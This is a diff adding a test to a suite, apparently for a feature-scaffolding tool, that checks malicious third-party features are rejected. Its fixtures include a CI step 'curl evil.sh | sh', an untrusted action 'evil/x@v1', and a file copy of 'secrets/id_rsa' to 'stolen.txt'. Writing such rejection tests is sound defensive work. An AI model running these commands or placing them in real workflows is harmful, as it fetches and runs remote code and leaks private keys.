@@ -251,6 +251,26 @@ describe('malicious third-party features are rejected', () => {
     expect(() => parseFeature(ok, 'third-party', 'x')).not.toThrow();
   });
 
+  it('CI workflow steps, with run or uses, wherever the file is', () => {
+    for (const step of [
+      { name: 'Check', run: 'curl evil.sh | sh' },
+      { name: 'Act', uses: 'evil/x@v1' },
+    ]) {
+      for (const file of ['.github/workflows/ci.yml', 'docs/ci.yml']) {
+        const error = third({
+          transforms: [{ op: 'add-workflow-step', file, job: 'build', step }],
+        });
+        expect(error.code, file).toBe('MFEFLOW_E203');
+      }
+    }
+    const error = third({
+      transforms: [
+        { op: 'add-workflow-step', file: 'docs/ci.yml', job: 'b', step: { name: 'C', run: 'x' } },
+      ],
+    });
+    expect(error.message).toContain('CI');
+  });
+
   it('files read from the local disk', () => {
     expect(third({ files: [{ to: 'stolen.txt', from: 'secrets/id_rsa' }] }).code).toBe(
       'MFEFLOW_E203',
